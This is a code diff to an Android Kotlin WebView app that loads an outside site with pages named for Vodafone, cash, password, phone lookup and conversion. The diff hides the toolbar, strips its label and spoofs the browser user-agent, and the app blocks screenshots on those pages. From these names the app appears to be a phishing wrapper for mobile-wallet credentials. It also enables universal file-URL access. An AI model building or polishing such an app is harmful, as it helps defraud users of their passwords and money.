@@ -2,6 +2,7 @@ package com.xantu.app
 
 import android.annotation.SuppressLint
 import android.graphics.Bitmap
+import android.graphics.Color
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Bundle
@@ -27,14 +28,14 @@ class MainActivity : AppCompatActivity() {
 
     private val WEBSITE_URL = "https://reviews8.site.je/"
 
-    // ===== مسارات الصفحات - هنا بتزود أي صفحة جديدة =====
+    // ===== مسارات الصفحات =====
     private val pagesWithBackButton = listOf(
         "ar-vodafone.html",
         "cash.html",
         "password.html",
         "api.php?phone=",
         "conversion.php",
-        "details.php"// الصفحة الجديدة اللي طلبتها
+        "details.php"
     )
 
     private val protectedPages = listOf(
@@ -43,7 +44,7 @@ class MainActivity : AppCompatActivity() {
         "password.html",
         "api.php?phone=",
         "conversion.php",
-        "details.php"// نفس الصفحة الجديدة محمية من السكرين شوت
+        "details.php"
     )
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -71,6 +72,17 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupToolbar() {
+        // زر شفاف تماما
+        toolbar.setBackgroundColor(Color.TRANSPARENT)
+        (toolbar.parent as? View)?.setBackgroundColor(Color.TRANSPARENT)
+        toolbar.elevation = 0f
+        
+        // نشيل كلمة رجوع
+        toolbar.title = ""
+        toolbar.subtitle = ""
+        
+        // سهم يمين بس
+        toolbar.setNavigationIcon(R.drawable.ic_arrow_right)
         toolbar.setNavigationOnClickListener { if (webView.canGoBack()) webView.goBack() }
         toolbar.isVisible = false
     }
@@ -92,6 +104,9 @@ class MainActivity : AppCompatActivity() {
         settings.allowFileAccessFromFileURLs = true
         settings.allowUniversalAccessFromFileURLs = true
         settings.mediaPlaybackRequiresUserGesture = false
+        // حل الصفحة البيضا
+        settings.userAgentString = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
+        
         CookieManager.getInstance().setAcceptCookie(true)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
         webView.webViewClient = object : WebViewClient() {
